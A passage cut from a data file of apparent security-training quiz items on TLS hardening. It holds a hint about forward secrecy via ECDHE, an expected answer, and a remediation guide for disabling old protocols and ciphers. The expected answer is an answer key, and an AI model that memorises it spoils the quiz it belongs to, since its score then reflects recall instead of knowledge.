        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  }
];
